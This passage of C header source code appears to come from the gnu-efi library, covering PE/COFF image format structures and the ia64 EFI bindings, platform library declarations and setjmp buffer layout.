    // Standard fields.
    //

    UINT16    Magic;
    UINT8     MajorLinkerVersion;
    UINT8     MinorLinkerVersion;
    UINT32    SizeOfCode;
    UINT32    SizeOfInitializedData;
    UINT32    SizeOfUninitializedData;
    UINT32    AddressOfEntryPoint;
    UINT32    BaseOfCode;
    UINT32    BaseOfData;
                
    //
    // NT additional fields.
    //

    UINT32   ImageBase;
    UINT32   SectionAlignment;
    UINT32   FileAlignment;
    UINT16   MajorOperatingSystemVersion;
    UINT16   MinorOperatingSystemVersion;
    UINT16   MajorImageVersion;
    UINT16   MinorImageVersion;
    UINT16   MajorSubsystemVersion;
    UINT16   MinorSubsystemVersion;
    UINT32   Reserved1;
    UINT32   SizeOfImage;
    UINT32   SizeOfHeaders;
    UINT32   CheckSum;
    UINT16   Subsystem;
    UINT16   DllCharacteristics;
    UINT32   SizeOfStackReserve;
    UINT32   SizeOfStackCommit;
    UINT32   SizeOfHeapReserve;
    UINT32   SizeOfHeapCommit;
    UINT32   LoaderFlags;
    UINT32   NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;

typedef struct _IMAGE_ROM_OPTIONAL_HEADER {
    UINT16  Magic;
    UINT8   MajorLinkerVersion;
    UINT8   MinorLinkerVersion;
    UINT32  SizeOfCode;
    UINT32  SizeOfInitializedData;
    UINT32  SizeOfUninitializedData;
    UINT32  AddressOfEntryPoint;
    UINT32  BaseOfCode;
    UINT32  BaseOfData;
    UINT32  BaseOfBss;
    UINT32  GprMask;
    UINT32  CprMask[4];
    UINT32  GpValue;
} IMAGE_ROM_OPTIONAL_HEADER, *PIMAGE_ROM_OPTIONAL_HEADER;

#define IMAGE_SIZEOF_ROM_OPTIONAL_HEADER      56
#define IMAGE_SIZEOF_STD_OPTIONAL_HEADER      28
#define IMAGE_SIZEOF_NT_OPTIONAL_HEADER      224

#define IMAGE_NT_OPTIONAL_HDR_MAGIC        0x10b
#define IMAGE_ROM_OPTIONAL_HDR_MAGIC       0x107

typedef struct _IMAGE_NT_HEADERS {
    UINT32 Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER OptionalHeader;
} IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;

typedef struct _IMAGE_ROM_HEADERS {
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_ROM_OPTIONAL_HEADER OptionalHeader;
} IMAGE_ROM_HEADERS, *PIMAGE_ROM_HEADERS;

#define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        \
    ((UINT32)ntheader +                                                  \
     FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 \
     ((PIMAGE_NT_HEADERS)(ntheader))->FileHeader.SizeOfOptionalHeader   \
    ))


// Subsystem Values

#define IMAGE_SUBSYSTEM_UNKNOWN              0   // Unknown subsystem.
#define IMAGE_SUBSYSTEM_NATIVE               1   // Image doesn't require a subsystem.
#define IMAGE_SUBSYSTEM_WINDOWS_GUI          2   // Image runs in the Windows GUI subsystem.
#define IMAGE_SUBSYSTEM_WINDOWS_CUI          3   // Image runs in the Windows character subsystem.
#define IMAGE_SUBSYSTEM_OS2_CUI              5   // image runs in the OS/2 character subsystem.
#define IMAGE_SUBSYSTEM_POSIX_CUI            7   // image run  in the Posix character subsystem.


// Directory Entries

#define IMAGE_DIRECTORY_ENTRY_EXPORT         0   // Export Directory
#define IMAGE_DIRECTORY_ENTRY_IMPORT         1   // Import Directory
#define IMAGE_DIRECTORY_ENTRY_RESOURCE       2   // Resource Directory
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION      3   // Exception Directory
#define IMAGE_DIRECTORY_ENTRY_SECURITY       4   // Security Directory
#define IMAGE_DIRECTORY_ENTRY_BASERELOC      5   // Base Relocation Table
#define IMAGE_DIRECTORY_ENTRY_DEBUG          6   // Debug Directory
#define IMAGE_DIRECTORY_ENTRY_COPYRIGHT      7   // Description String
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR      8   // Machine Value (MIPS GP)
#define IMAGE_DIRECTORY_ENTRY_TLS            9   // TLS Directory
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG   10   // Load Configuration Directory

//
// Section header format.
//

#define IMAGE_SIZEOF_SHORT_NAME              8

typedef struct _IMAGE_SECTION_HEADER {
    UINT8   Name[IMAGE_SIZEOF_SHORT_NAME];
    union {
            UINT32   PhysicalAddress;
            UINT32   VirtualSize;
    } Misc;
    UINT32   VirtualAddress;
    UINT32   SizeOfRawData;
    UINT32   PointerToRawData;
    UINT32   PointerToRelocations;
    UINT32   PointerToLinenumbers;
    UINT16   NumberOfRelocations;
    UINT16   NumberOfLinenumbers;
    UINT32   Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

#define IMAGE_SIZEOF_SECTION_HEADER          40

#define IMAGE_SCN_TYPE_NO_PAD                0x00000008  // Reserved.

#define IMAGE_SCN_CNT_CODE                   0x00000020  // Section contains code.
#define IMAGE_SCN_CNT_INITIALIZED_DATA       0x00000040  // Section contains initialized data.
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA     0x00000080  // Section contains uninitialized data.

#define IMAGE_SCN_LNK_OTHER                  0x00000100  // Reserved.
#define IMAGE_SCN_LNK_INFO                   0x00000200  // Section contains comments or some other type of information.
#define IMAGE_SCN_LNK_REMOVE                 0x00000800  // Section contents will not become part of image.
#define IMAGE_SCN_LNK_COMDAT                 0x00001000  // Section contents comdat.

#define IMAGE_SCN_ALIGN_1BYTES               0x00100000  //
#define IMAGE_SCN_ALIGN_2BYTES               0x00200000  //
#define IMAGE_SCN_ALIGN_4BYTES               0x00300000  //
#define IMAGE_SCN_ALIGN_8BYTES               0x00400000  //
#define IMAGE_SCN_ALIGN_16BYTES              0x00500000  // Default alignment if no others are specified.
#define IMAGE_SCN_ALIGN_32BYTES              0x00600000  //
#define IMAGE_SCN_ALIGN_64BYTES              0x00700000  //

#define IMAGE_SCN_MEM_DISCARDABLE            0x02000000  // Section can be discarded.
#define IMAGE_SCN_MEM_NOT_CACHED             0x04000000  // Section is not cachable.
#define IMAGE_SCN_MEM_NOT_PAGED              0x08000000  // Section is not pageable.
#define IMAGE_SCN_MEM_SHARED                 0x10000000  // Section is shareable.
#define IMAGE_SCN_MEM_EXECUTE                0x20000000  // Section is executable.
#define IMAGE_SCN_MEM_READ                   0x40000000  // Section is readable.
#define IMAGE_SCN_MEM_WRITE                  0x80000000  // Section is writeable.

//
// Symbol format.
//


#define IMAGE_SIZEOF_SYMBOL                  18

//
// Section values.
//
// Symbols have a section number of the section in which they are
// defined. Otherwise, section numbers have the following meanings:
//

#define IMAGE_SYM_UNDEFINED           (UINT16)0           // Symbol is undefined or is common.
#define IMAGE_SYM_ABSOLUTE            (UINT16)-1          // Symbol is an absolute value.
#define IMAGE_SYM_DEBUG               (UINT16)-2          // Symbol is a special debug item.

//
// Type (fundamental) values.
//

#define IMAGE_SYM_TYPE_NULL                  0           // no type.
#define IMAGE_SYM_TYPE_VOID                  1           //
#define IMAGE_SYM_TYPE_CHAR                  2           // type character.
#define IMAGE_SYM_TYPE_SHORT                 3           // type short integer.
#define IMAGE_SYM_TYPE_INT                   4           //
#define IMAGE_SYM_TYPE_LONG                  5           //
#define IMAGE_SYM_TYPE_FLOAT                 6           //
#define IMAGE_SYM_TYPE_DOUBLE                7           //
#define IMAGE_SYM_TYPE_STRUCT                8           //
#define IMAGE_SYM_TYPE_UNION                 9           //
#define IMAGE_SYM_TYPE_ENUM                  10          // enumeration.
#define IMAGE_SYM_TYPE_MOE                   11          // member of enumeration.
#define IMAGE_SYM_TYPE_BYTE                  12          //
#define IMAGE_SYM_TYPE_WORD                  13          //
#define IMAGE_SYM_TYPE_UINT                  14          //
#define IMAGE_SYM_TYPE_DWORD                 15          //

//
// Type (derived) values.
//

#define IMAGE_SYM_DTYPE_NULL                 0           // no derived type.
#define IMAGE_SYM_DTYPE_POINTER              1           // pointer.
#define IMAGE_SYM_DTYPE_FUNCTION             2           // function.
#define IMAGE_SYM_DTYPE_ARRAY                3           // array.

//
// Storage classes.
//

#define IMAGE_SYM_CLASS_END_OF_FUNCTION      (BYTE )-1
#define IMAGE_SYM_CLASS_NULL                 0
#define IMAGE_SYM_CLASS_AUTOMATIC            1
#define IMAGE_SYM_CLASS_EXTERNAL             2
#define IMAGE_SYM_CLASS_STATIC               3
#define IMAGE_SYM_CLASS_REGISTER             4
#define IMAGE_SYM_CLASS_EXTERNAL_DEF         5
#define IMAGE_SYM_CLASS_LABEL                6
#define IMAGE_SYM_CLASS_UNDEFINED_LABEL      7
#define IMAGE_SYM_CLASS_MEMBER_OF_STRUCT     8
#define IMAGE_SYM_CLASS_ARGUMENT             9
#define IMAGE_SYM_CLASS_STRUCT_TAG           10
#define IMAGE_SYM_CLASS_MEMBER_OF_UNION      11
#define IMAGE_SYM_CLASS_UNION_TAG            12
#define IMAGE_SYM_CLASS_TYPE_DEFINITION      13
#define IMAGE_SYM_CLASS_UNDEFINED_STATIC     14
#define IMAGE_SYM_CLASS_ENUM_TAG             15
#define IMAGE_SYM_CLASS_MEMBER_OF_ENUM       16
#define IMAGE_SYM_CLASS_REGISTER_PARAM       17
#define IMAGE_SYM_CLASS_BIT_FIELD            18
#define IMAGE_SYM_CLASS_BLOCK                100
#define IMAGE_SYM_CLASS_FUNCTION             101
#define IMAGE_SYM_CLASS_END_OF_STRUCT        102
#define IMAGE_SYM_CLASS_FILE                 103
// new
#define IMAGE_SYM_CLASS_SECTION              104
#define IMAGE_SYM_CLASS_WEAK_EXTERNAL        105

// type packing constants

#define N_BTMASK                            017
#define N_TMASK                             060
#define N_TMASK1                            0300
#define N_TMASK2                            0360
#define N_BTSHFT                            4
#define N_TSHIFT                            2

// MACROS

//
// Communal selection types.
//

#define IMAGE_COMDAT_SELECT_NODUPLICATES   1
#define IMAGE_COMDAT_SELECT_ANY            2
#define IMAGE_COMDAT_SELECT_SAME_SIZE      3
#define IMAGE_COMDAT_SELECT_EXACT_MATCH    4
#define IMAGE_COMDAT_SELECT_ASSOCIATIVE    5

#define IMAGE_WEAK_EXTERN_SEARCH_NOLIBRARY 1
#define IMAGE_WEAK_EXTERN_SEARCH_LIBRARY   2
#define IMAGE_WEAK_EXTERN_SEARCH_ALIAS     3


//
// Relocation format.
//

typedef struct _IMAGE_RELOCATION {
    UINT32   VirtualAddress;
    UINT32   SymbolTableIndex;
    UINT16    Type;
} IMAGE_RELOCATION;

#define IMAGE_SIZEOF_RELOCATION              10

//
// I386 relocation types.
//

#define IMAGE_REL_I386_ABSOLUTE              0           // Reference is absolute, no relocation is necessary
#define IMAGE_REL_I386_DIR16                 01          // Direct 16-bit reference to the symbols virtual address
#define IMAGE_REL_I386_REL16                 02          // PC-relative 16-bit reference to the symbols virtual address
#define IMAGE_REL_I386_DIR32                 06          // Direct 32-bit reference to the symbols virtual address
#define IMAGE_REL_I386_DIR32NB               07          // Direct 32-bit reference to the symbols virtual address, base not included
#define IMAGE_REL_I386_SEG12                 011         // Direct 16-bit reference to the segment-selector bits of a 32-bit virtual address
#define IMAGE_REL_I386_SECTION               012
#define IMAGE_REL_I386_SECREL                013
#define IMAGE_REL_I386_REL32                 024         // PC-relative 32-bit reference to the symbols virtual address

//
// MIPS relocation types.
//

#define IMAGE_REL_MIPS_ABSOLUTE              0           // Reference is absolute, no relocation is necessary
#define IMAGE_REL_MIPS_REFHALF               01
#define IMAGE_REL_MIPS_REFWORD               02
#define IMAGE_REL_MIPS_JMPADDR               03
#define IMAGE_REL_MIPS_REFHI                 04
#define IMAGE_REL_MIPS_REFLO                 05
#define IMAGE_REL_MIPS_GPREL                 06
#define IMAGE_REL_MIPS_LITERAL               07
#define IMAGE_REL_MIPS_SECTION               012
#define IMAGE_REL_MIPS_SECREL                013
#define IMAGE_REL_MIPS_REFWORDNB             042
#define IMAGE_REL_MIPS_PAIR                  045

//
// Alpha Relocation types.
//

#define IMAGE_REL_ALPHA_ABSOLUTE             0x0
#define IMAGE_REL_ALPHA_REFLONG              0x1
#define IMAGE_REL_ALPHA_REFQUAD              0x2
#define IMAGE_REL_ALPHA_GPREL32              0x3
#define IMAGE_REL_ALPHA_LITERAL              0x4
#define IMAGE_REL_ALPHA_LITUSE               0x5
#define IMAGE_REL_ALPHA_GPDISP               0x6
#define IMAGE_REL_ALPHA_BRADDR               0x7
#define IMAGE_REL_ALPHA_HINT                 0x8
#define IMAGE_REL_ALPHA_INLINE_REFLONG       0x9
#define IMAGE_REL_ALPHA_REFHI                0xA
#define IMAGE_REL_ALPHA_REFLO                0xB
#define IMAGE_REL_ALPHA_PAIR                 0xC
#define IMAGE_REL_ALPHA_MATCH                0xD
#define IMAGE_REL_ALPHA_SECTION              0xE
#define IMAGE_REL_ALPHA_SECREL               0xF
#define IMAGE_REL_ALPHA_REFLONGNB            0x10

//
// IBM PowerPC relocation types.
//

#define IMAGE_REL_PPC_ABSOLUTE 0x0000  // NOP
#define IMAGE_REL_PPC_ADDR64   0x0001  // 64-bit address
#define IMAGE_REL_PPC_ADDR32   0x0002  // 32-bit address
#define IMAGE_REL_PPC_ADDR24   0x0003  // 26-bit address, shifted left 2 (branch absolute)
#define IMAGE_REL_PPC_ADDR16   0x0004  // 16-bit address
#define IMAGE_REL_PPC_ADDR14   0x0005  // 16-bit address, shifted left 2 (load doubleword)
#define IMAGE_REL_PPC_REL24    0x0006  // 26-bit PC-relative offset, shifted left 2 (branch relative)
#define IMAGE_REL_PPC_REL14    0x0007  // 16-bit PC-relative offset, shifted left 2 (br cond relative)
#define IMAGE_REL_PPC_TOCREL16 0x0008  // 16-bit offset from TOC base
#define IMAGE_REL_PPC_TOCREL14 0x0009  // 16-bit offset from TOC base, shifted left 2 (load doubleword)

#define IMAGE_REL_PPC_ADDR32NB 0x000A  // 32-bit addr w/o image base
#define IMAGE_REL_PPC_SECREL   0x000B  // va of containing section (as in an image sectionhdr)
#define IMAGE_REL_PPC_SECTION  0x000C  // sectionheader number
#define IMAGE_REL_PPC_IFGLUE   0x000D  // substitute TOC restore instruction iff symbol is glue code
#define IMAGE_REL_PPC_IMGLUE   0x000E  // symbol is glue code; virtual address is TOC restore instruction

#define IMAGE_REL_PPC_TYPEMASK 0x00FF  // mask to isolate above values in IMAGE_RELOCATION.Type

// Flag bits in IMAGE_RELOCATION.TYPE

#define IMAGE_REL_PPC_NEG      0x0100  // subtract reloc value rather than adding it
#define IMAGE_REL_PPC_BRTAKEN  0x0200  // fix branch prediction bit to predict branch taken
#define IMAGE_REL_PPC_BRNTAKEN 0x0400  // fix branch prediction bit to predict branch not taken
#define IMAGE_REL_PPC_TOCDEFN  0x0800  // toc slot defined in file (or, data in toc)

//
// Based relocation format.
//

typedef struct _IMAGE_BASE_RELOCATION {
    UINT32   VirtualAddress;
    UINT32   SizeOfBlock;
//  UINT16    TypeOffset[1];
} IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;

#define IMAGE_SIZEOF_BASE_RELOCATION         8

//
// Based relocation types.
//

#define IMAGE_REL_BASED_ABSOLUTE              0
#define IMAGE_REL_BASED_HIGH                  1
#define IMAGE_REL_BASED_LOW                   2
#define IMAGE_REL_BASED_HIGHLOW               3
#define IMAGE_REL_BASED_HIGHADJ               4
#define IMAGE_REL_BASED_MIPS_JMPADDR          5
#define IMAGE_REL_BASED_IA64_IMM64            9
#define IMAGE_REL_BASED_DIR64                 10

//
// Line number format.
//

typedef struct _IMAGE_LINENUMBER {
    union {
        UINT32   SymbolTableIndex;               // Symbol table index of function name if Linenumber is 0.
        UINT32   VirtualAddress;                 // Virtual address of line number.
    } Type;
    UINT16    Linenumber;                         // Line number.
} IMAGE_LINENUMBER;

#define IMAGE_SIZEOF_LINENUMBER              6

//
// Archive format.
//

#define IMAGE_ARCHIVE_START_SIZE             8
#define IMAGE_ARCHIVE_START                  "!<arch>\n"
#define IMAGE_ARCHIVE_END                    "`\n"
#define IMAGE_ARCHIVE_PAD                    "\n"
#define IMAGE_ARCHIVE_LINKER_MEMBER          "/               "
#define IMAGE_ARCHIVE_LONGNAMES_MEMBER       "//              "

typedef struct _IMAGE_ARCHIVE_MEMBER_HEADER {
    UINT8     Name[16];                          // File member name - `/' terminated.
    UINT8     Date[12];                          // File member date - decimal.
    UINT8     UserID[6];                         // File member user id - decimal.
    UINT8     GroupID[6];                        // File member group id - decimal.
    UINT8     Mode[8];                           // File member mode - octal.
    UINT8     Size[10];                          // File member size - decimal.
    UINT8     EndHeader[2];                      // String to end header.
} IMAGE_ARCHIVE_MEMBER_HEADER, *PIMAGE_ARCHIVE_MEMBER_HEADER;

#define IMAGE_SIZEOF_ARCHIVE_MEMBER_HDR      60

//
// DLL support.
//

//
// Export Format
//

typedef struct _IMAGE_EXPORT_DIRECTORY {
    UINT32   Characteristics;
    UINT32   TimeDateStamp;
    UINT16   MajorVersion;
    UINT16   MinorVersion;
    UINT32   Name;
    UINT32   Base;
    UINT32   NumberOfFunctions;
    UINT32   NumberOfNames;
    UINT32   *AddressOfFunctions;
    UINT32   *AddressOfNames;
    UINT32   *AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

//
// Import Format
//

typedef struct _IMAGE_IMPORT_BY_NAME {
    UINT16    Hint;
    UINT8     Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;

typedef struct _IMAGE_THUNK_DATA {
    union {
        UINT32 Function;
        UINT32 Ordinal;
        PIMAGE_IMPORT_BY_NAME AddressOfData;
    } u1;
} IMAGE_THUNK_DATA, *PIMAGE_THUNK_DATA;

#define IMAGE_ORDINAL_FLAG 0x80000000
#define IMAGE_SNAP_BY_ORDINAL(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG) != 0)
#define IMAGE_ORDINAL(Ordinal) (Ordinal & 0xffff)

typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    UINT32   Characteristics;
    UINT32   TimeDateStamp;
    UINT32   ForwarderChain;
    UINT32   Name;
    PIMAGE_THUNK_DATA FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;

#endif

```

`include/gnu-efi/ia64/efibind.h`:

```h
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efefind.h

Abstract:

    EFI to compile bindings




Revision History

--*/

#pragma pack()


//
// Basic int types of various widths
//

#if !defined(__STDC_VERSION__) || (__STDC_VERSION__ < 199901L ) && !defined(__cplusplus)

    // No ANSI C 1999/2000 stdint.h integer width declarations 

    #ifdef _MSC_EXTENSIONS
        // Use Microsoft C compiler integer width declarations 

        typedef unsigned __int64    uint64_t;
        typedef __int64             int64_t;
        typedef unsigned __int32    uint32_t;
        typedef __int32             int32_t;
        typedef unsigned __int16    uint16_t;
        typedef __int16             int16_t;
        typedef unsigned __int8     uint8_t;
        typedef __int8              int8_t;
    #elif defined(UNIX_LP64)
        // Use LP64 programming model from C_FLAGS for integer width declarations 

        typedef unsigned long       uint64_t;
        typedef long                int64_t;
        typedef unsigned int        uint32_t;
        typedef int                 int32_t;
        typedef unsigned short      uint16_t;
        typedef short               int16_t;
        typedef unsigned char       uint8_t;
        typedef char                int8_t;
    #else
        // Assume P64 programming model from C_FLAGS for integer width declarations 

        typedef unsigned long long  uint64_t;
        typedef long long           int64_t;
        typedef unsigned int        uint32_t;
        typedef int                 int32_t;
        typedef unsigned short      uint16_t;
        typedef short               int16_t;
        typedef unsigned char       uint8_t;
        typedef char                int8_t;
    #endif
    typedef uint64_t            uintptr_t;
    typedef int64_t             intptr_t;
#elif defined(__GNUC__)
    #include <stdint.h>
#endif

//
// Basic EFI types of various widths
//
#ifndef __WCHAR_TYPE__
# define __WCHAR_TYPE__	short
#endif


typedef uint64_t   UINT64;
typedef int64_t    INT64;
typedef uint32_t   UINT32;
typedef int32_t    INT32;
typedef uint16_t   UINT16;
typedef int16_t    INT16;
typedef uint8_t    UINT8;
typedef int8_t     INT8;
typedef __WCHAR_TYPE__ WCHAR;


#undef VOID
#define VOID    void


typedef int64_t    INTN;
typedef uint64_t   UINTN;

//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// BugBug: Code to debug
//
#define BIT63   0x8000000000000000

#define PLATFORM_IOBASE_ADDRESS   (0xffffc000000 | BIT63)                                               
#define PORT_TO_MEMD(_Port) (PLATFORM_IOBASE_ADDRESS | ( ( ( (_Port) & 0xfffc) << 10 ) | ( (_Port) & 0x0fff) ) )
                                                                           
//                                                                  
// Macro's with casts make this much easier to use and read.
//
#define PORT_TO_MEM8D(_Port)  (*(UINT8  *)(PORT_TO_MEMD(_Port)))
#define POST_CODE(_Data)  (PORT_TO_MEM8D(0x80) = (_Data))
//
// BugBug: End Debug Code!!!
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#define EFIERR(a)           (0x8000000000000000 | a)
#define EFI_ERROR_MASK      0x8000000000000000
#define EFIERR_OEM(a)       (0xc000000000000000 | a)      

#define BAD_POINTER         0xFBFBFBFBFBFBFBFB
#define MAX_ADDRESS         0xFFFFFFFFFFFFFFFF

#define BREAKPOINT()        while (TRUE)

//
// Pointers must be aligned to these address to function
//  you will get an alignment fault if this value is less than 8
//
#define MIN_ALIGNMENT_SIZE  8

#define ALIGN_VARIABLE(Value , Adjustment) \
            (UINTN) Adjustment = 0; \
            if((UINTN)Value % MIN_ALIGNMENT_SIZE) \
                (UINTN)Adjustment = MIN_ALIGNMENT_SIZE - ((UINTN)Value % MIN_ALIGNMENT_SIZE); \
            Value = (UINTN)Value + (UINTN)Adjustment

//
// Define macros to create data structure signatures.
//

#define EFI_SIGNATURE_16(A,B)             ((A) | (B<<8))
#define EFI_SIGNATURE_32(A,B,C,D)         (EFI_SIGNATURE_16(A,B)     | (EFI_SIGNATURE_16(C,D)     << 16))
#define EFI_SIGNATURE_64(A,B,C,D,E,F,G,H) (EFI_SIGNATURE_32(A,B,C,D) | ((UINT64)(EFI_SIGNATURE_32(E,F,G,H)) << 32))
//
// To export & import functions in the EFI emulator environment
//

    #define EXPORTAPI

//
// EFIAPI - prototype calling convention for EFI function pointers
// BOOTSERVICE - prototype for implementation of a boot service interface
// RUNTIMESERVICE - prototype for implementation of a runtime service interface
// RUNTIMEFUNCTION - prototype for implementation of a runtime function that is not a service
// RUNTIME_CODE - pragma macro for declaring runtime code    
//

#ifndef EFIAPI                  // Forces EFI calling conventions reguardless of compiler options 
    #ifdef _MSC_EXTENSIONS
        #define EFIAPI __cdecl  // Force C calling convention for Microsoft C compiler 
    #else
        #define EFIAPI          // Substitute expresion to force C calling convention 
    #endif
#endif

#define BOOTSERVICE
#define RUNTIMESERVICE
#define RUNTIMEFUNCTION

#define RUNTIME_CODE(a)         alloc_text("rtcode", a)
#define BEGIN_RUNTIME_DATA()    data_seg("rtdata")
#define END_RUNTIME_DATA()      data_seg("")

#define VOLATILE    volatile

//
// BugBug: Need to find out if this is portable accross compliers.
//
#ifdef __GNUC__
#define MEMORY_FENCE()    __asm__ __volatile__ ("mf.a" ::: "memory")
#else
void __mf (void);                       
#pragma intrinsic (__mf)  
#define MEMORY_FENCE()    __mf()
#endif

//
// When build similiar to FW, then link everything together as
// one big module. For the MSVC toolchain, we simply tell the
// linker what our driver init function is using /ENTRY.
//
#if defined(_MSC_EXTENSIONS)
    #define EFI_DRIVER_ENTRY_POINT(InitFunction) \
        __pragma(comment(linker, "/ENTRY:" # InitFunction))
#else
    #define EFI_DRIVER_ENTRY_POINT(InitFunction)    \
        UINTN                                       \
        InitializeDriver (                          \
            VOID    *ImageHandle,                   \
            VOID    *SystemTable                    \
            )                                       \
        {                                           \
            return InitFunction(ImageHandle,        \
                    SystemTable);                   \
        }                                           \
                                                    \
        EFI_STATUS efi_main(                        \
            EFI_HANDLE image,                       \
            EFI_SYSTEM_TABLE *systab                \
            ) __attribute__((weak,                  \
                    alias ("InitializeDriver")));
#endif

#define LOAD_INTERNAL_DRIVER(_if, type, name, entry)    \
        (_if)->LoadInternal(type, name, entry)

//
// Some compilers don't support the forward reference construct:
//  typedef struct XXXXX
//
// The following macro provide a workaround for such cases.
//
#ifdef NO_INTERFACE_DECL
#define INTERFACE_DECL(x)
#else
#if defined(__GNUC__) || defined(_MSC_EXTENSIONS)
#define INTERFACE_DECL(x) struct x
#else
#define INTERFACE_DECL(x) typedef struct x
#endif
#endif

/* No efi call wrapper for IA32 architecture */
#define uefi_call_wrapper(func, va_num, ...)	func(__VA_ARGS__)
#define EFI_FUNCTION

```

`include/gnu-efi/ia64/efilibplat.h`:

```h
#ifndef _EFI_LIB_PLAT_H
#define _EFI_LIB_PLAT_H
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efilibplat.h

Abstract:

    EFI to compile bindings



Revision History

--*/

#include "salproc.h"


VOID
InitializeLibPlatform (
    IN EFI_HANDLE           ImageHandle,
    IN EFI_SYSTEM_TABLE     *SystemTable
    );

VOID
LibInitSalAndPalProc(
    OUT PLABEL  *SalPlabel,
    OUT UINT64  *PalEntry
    );

EFI_STATUS
LibGetSalIoPortMapping (
    OUT UINT64  *IoPortMapping
    );

EFI_STATUS
LibGetSalIpiBlock (
    OUT UINT64  *IpiBlock
    );

EFI_STATUS
LibGetSalWakeupVector (
    OUT UINT64  *WakeVector
    );

VOID *
LibSearchSalSystemTable (
    IN  UINT8   EntryType  
    );


VOID
LibSalProc (
    IN  UINT64    Arg1,
    IN  UINT64    Arg2,
    IN  UINT64    Arg3,
    IN  UINT64    Arg4,
    IN  UINT64    Arg5,
    IN  UINT64    Arg6,
    IN  UINT64    Arg7,
    IN  UINT64    Arg8,
    OUT rArg      *Results  OPTIONAL
    );

VOID
LibPalProc (
    IN  UINT64    Arg1,
    IN  UINT64    Arg2,
    IN  UINT64    Arg3,
    IN  UINT64    Arg4,
    OUT rArg      *Results  OPTIONAL
    );

#endif


```

`include/gnu-efi/ia64/efisetjmp_arch.h`:

```h
#ifndef GNU_EFI_IA64_SETJMP_H
#define GNU_EFI_IA64_SETJMP_H

#define JMPBUF_ALIGN 0x10

typedef struct {
	UINT64	F2[2];
	UINT64	F3[2];
	UINT64	F4[2];
	UINT64	F5[2];
	UINT64	F16[2];
	UINT64	F17[2];
	UINT64	F18[2];
	UINT64	F19[2];
	UINT64	F20[2];
	UINT64	F21[2];
	UINT64	F22[2];
	UINT64	F23[2];
	UINT64	F24[2];
	UINT64	F25[2];
	UINT64	F26[2];
	UINT64	F27[2];
	UINT64	F28[2];
	UINT64	F29[2];
	UINT64	F30[2];
	UINT64	F31[2];
	UINT64	R4;
	UINT64	R5;
	UINT64	R6;
	UINT64	R7;
	UINT64	SP;
	UINT64	BR0;
	UINT64	BR1;
	UINT64	BR2;
	UINT64	BR3;
	UINT64	BR4;
	UINT64	BR5;
	UINT64	InitialUNAT;
	UINT64	AfterSpillUNAT;
	UINT64	PFS;
	UINT64	BSP;
	UINT64	Predicates;
	UINT64	LoopCount;
	UINT64	FPSR;
} ALIGN(JMPBUF_ALIGN) jmp_buf[1];

#endif /* GNU_EFI_IA64_SETJMP_H */

```

`include/gnu-efi/ia64/pe.h`:

```h
/* 
    PE32+ header file
 */
#ifndef _PE_H
#define _PE_H

#define IMAGE_DOS_SIGNATURE                 0x5A4D      // MZ
#define IMAGE_OS2_SIGNATURE                 0x454E      // NE
#define IMAGE_OS2_SIGNATURE_LE              0x454C      // LE
#define IMAGE_NT_SIGNATURE                  0x00004550  // PE00  
#define IMAGE_EDOS_SIGNATURE                0x44454550  // PEED

/*****************************************************************************
 * The following stuff comes from winnt.h from the ia64sdk, plus the Plabel for
 * loading EM executables.
 *****************************************************************************/
//
// Intel IA64 specific
//

#define IMAGE_REL_BASED_IA64_IMM64            9
#define IMAGE_REL_BASED_IA64_DIR64            10

struct Plabel { 
    UINT64  EntryPoint;
    UINT64  NewGP;
};

typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
    UINT16   e_magic;                     // Magic number
    UINT16   e_cblp;                      // Bytes on last page of file
    UINT16   e_cp;                        // Pages in file
    UINT16   e_crlc;                      // Relocations
    UINT16   e_cparhdr;                   // Size of header in paragraphs
    UINT16   e_minalloc;                  // Minimum extra paragraphs needed
    UINT16   e_maxalloc;                  // Maximum extra paragraphs needed
    UINT16   e_ss;                        // Initial (relative) SS value
    UINT16   e_sp;                        // Initial SP value
    UINT16   e_csum;                      // Checksum
    UINT16   e_ip;                        // Initial IP value
    UINT16   e_cs;                        // Initial (relative) CS value
    UINT16   e_lfarlc;                    // File address of relocation table
    UINT16   e_ovno;                      // Overlay number
    UINT16   e_res[4];                    // Reserved words
    UINT16   e_oemid;                     // OEM identifier (for e_oeminfo)
    UINT16   e_oeminfo;                   // OEM information; e_oemid specific
    UINT16   e_res2[10];                  // Reserved words
    UINT32   e_lfanew;                    // File address of new exe header
  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_OS2_HEADER {      // OS/2 .EXE header
    UINT16   ne_magic;                    // Magic number
    UINT8    ne_ver;                      // Version number
    UINT8    ne_rev;                      // Revision number
    UINT16   ne_enttab;                   // Offset of Entry Table
    UINT16   ne_cbenttab;                 // Number of bytes in Entry Table
    UINT32   ne_crc;                      // Checksum of whole file
    UINT16   ne_flags;                    // Flag UINT16
    UINT16   ne_autodata;                 // Automatic data segment number
    UINT16   ne_heap;                     // Initial heap allocation
    UINT16   ne_stack;                    // Initial stack allocation
